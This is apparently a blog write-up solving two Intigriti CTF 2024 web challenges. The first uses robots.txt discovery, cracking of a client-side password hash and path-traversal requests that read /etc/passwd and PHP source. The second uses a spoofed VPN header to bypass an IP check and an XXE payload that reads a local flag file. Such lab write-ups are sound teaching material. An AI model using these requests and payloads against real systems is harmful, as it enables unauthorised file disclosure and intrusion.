---
title: Intigriti CTF 2024 - WEB
date: 2024-11-18
tags: [ctf, web]
categories: [CTF Writeups]
author: 2Fa0n
img_path: /assets/img/Intigriti-ctf_2024
image: /assets/img/Intigriti-ctf_2024/intigriti_banner.png
---

## Pizza Paradise
**Solvers:** 395 <br>
**Author:** CryptoCat

### Description
Something weird going on at this pizza store!! <br>
![Pizza Paradise](/assets/img/Intigriti-ctf_2024/pizza_paradise.png)

### Solution
Looking around does not have any interesting things, let's check the `robots.txt` file.

```
User-agent: *
Disallow: /secret_172346606e1d24062e891d537e917a90.html
Disallow: /assets/
```

Let access the `/secret_172346606e1d24062e891d537e917a90.html` page. <br>
![Secret Page](/assets/img/Intigriti-ctf_2024/secret_page.png)

Check the source code of the page.

```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <title>Top Secret Government Access</title>
        <link
            href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap"
            rel="stylesheet"
        />
        <link rel="stylesheet" href="/assets/css/secret-theme.css" />
        <script src="/assets/js/auth.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
        <script>
            function hashPassword(password) {
                return CryptoJS.SHA256(password).toString();
            }

            function validate() {
                const username = document.getElementById("username").value;
                const password = document.getElementById("password").value;

                const credentials = getCredentials();
                const passwordHash = hashPassword(password);

                if (
                    username === credentials.username &&
                    passwordHash === credentials.passwordHash
                ) {
                    return true;
                } else {
                    alert("Invalid credentials!");
                    return false;
                }
            }
        </script>
    </head>
    <body>
        <div class="container">
            <h1>Top Secret Government Access</h1>
            <form id="loginForm" action="login.php" method="POST" onsubmit="return validate();">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" required /><br />
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required /><br />
                <input type="submit" value="Login" />
            </form>
        </div>
    </body>
</html>
```

We can see that the password is hashed using SHA256 and the credentials are stored in the `/assets/js/auth.js` file.

```js
const validUsername = "agent_1337";
const validPasswordHash = "91a915b6bdcfb47045859288a9e2bd651af246f07a083f11958550056bed8eac";

function getCredentials() {
    return {
        username: validUsername,
        passwordHash: validPasswordHash,
    };
}
```

Let crack the password hash using [CrackStation](https://crackstation.net/). <br>

![CrackStation](/assets/img/Intigriti-ctf_2024/crackstation.png)

We have the credentials, let's login.

```
username: agent_1337
password: intel420
```

Login successfully and access to the portal and download the secret file. <br>

![Portal](/assets/img/Intigriti-ctf_2024/portal.png)

When we click download the secret file, we get the GET request in burp suite.

```
GET /topsecret_a9aedc6c39f654e55275ad8e65e316b3.php?download=/assets/images/topsecret1.png
```

Let try `/etc/passwd`.

```
GET /topsecret_a9aedc6c39f654e55275ad8e65e316b3.php?download=/etc/passwd
```

The response is `File path not allowed!`.
Try path traversal inside the `/assets/images` directory.

```
GET /topsecret_a9aedc6c39f654e55275ad8e65e316b3.php?download=/assets/images/../../etc/passwd
```

It gets `File not found!` so it works!

We will try to get the source code of this file `topsecret_a9aedc6c39f654e55275ad8e65e316b3.php`.

```
GET /topsecret_a9aedc6c39f654e55275ad8e65e316b3.php?download=/assets/images/../../topsecret_a9aedc6c39f654e55275ad8e65e316b3.php
```

![Source Code](/assets/img/Intigriti-ctf_2024/source_code.png)

We can see the flag inside the source code.

```php
$flag = 'INTIGRITI{70p_53cr37_m15510n_c0mpl373}';
```

**Flag:** `INTIGRITI{70p_53cr37_m15510n_c0mpl373}`

## Biocorp
**Solvers:** 389 <br>
**Author:** CryptoCat

### Description
BioCorp contacted us with some concerns about the security of their network. Specifically, they want to make sure they've decoupled any dangerous functionality from the public facing website. Could you give it a quick review? <br>
![Biocorp](/assets/img/Intigriti-ctf_2024/biocorp.png)

### Solution
We look around the website and find nothing interesting. Let's check the source code which is provided by the challenge. <br>
![Biocorp Source Code](/assets/img/Intigriti-ctf_2024/biocorp_source_code.png)

We notice some interesting things in the source code.
```php
<?php
$ip_address = $_SERVER['HTTP_X_BIOCORP_VPN'] ?? $_SERVER['REMOTE_ADDR'];

if ($ip_address !== '80.187.61.102') {
    echo "<h1>Access Denied</h1>";
    echo "<p>You do not have permission to access this page.</p>";
    exit;
}
```

We can see the ip for the vpn is `80.187.61.102` that can be access to other restricted pages.
Let's access that page with by adding the header `X-Biocorp-Vpn: 80.187.61.102` to the request.
![Biocorp Panel](/assets/img/Intigriti-ctf_2024/biocorp_panel.png)

We are now access to the restricted page. Let's continue to check the source code of the page.
```php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && strpos($_SERVER['CONTENT_TYPE'], 'application/xml') !== false) {
    $xml_data = file_get_contents('php://input');
    $doc = new DOMDocument();
    if (!$doc->loadXML($xml_data, LIBXML_NOENT)) {
        echo "<h1>Invalid XML</h1>";
        exit;
    }
} else {
    $xml_data = file_get_contents('data/reactor_data.xml');
    $doc = new DOMDocument();
    $doc->loadXML($xml_data, LIBXML_NOENT);
}
```

We can see that this page display the content of the `reactor_data.xml` file. And it also accept the POST request with the content type is `application/xml`.

This is the typical XML External Entity (XXE) attack. We can read the file from the local file system.

Let's try to read the `flag.txt` file.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<reactor>
    <status>
        <temperature>&xxe;</temperature>
        <pressure>1337</pressure>
        <control_rods>Lowered</control_rods>
    </status>
</reactor>
```
![Biocorp Flag](/assets/img/Intigriti-ctf_2024/biocorp_flag.png)

We have the flag.

**Flag:** `INTIGRITI{c4r3ful_w17h_7h053_c0n7r0l5_0r_7h3r3_w1ll_b3_4_m3l7d0wn}`